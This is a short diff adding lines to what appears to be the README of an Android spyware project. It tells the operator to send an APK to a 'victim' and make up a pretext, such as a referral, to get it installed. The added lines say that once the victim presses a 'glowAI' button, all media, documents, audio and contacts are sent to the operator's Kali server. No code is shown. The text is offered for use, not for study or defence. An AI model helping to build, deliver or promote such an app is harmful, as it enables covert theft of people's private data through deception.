@@ -8,6 +8,9 @@ victim -> Android
 
 Requirements: just send apk to victim and excuse him to install app just for any reason(u have to made your own reason) ( suggestion : ask him to install for refral)
 
+PURPOSE:
+Once victim install the app and press glowAI button : ALL media/documents/Audios/Contacts will be transferred to Kali Server
+
 
 {This project is officially mine from 0 to 100. i have not used anyone else's a file or even a single code.} 
 
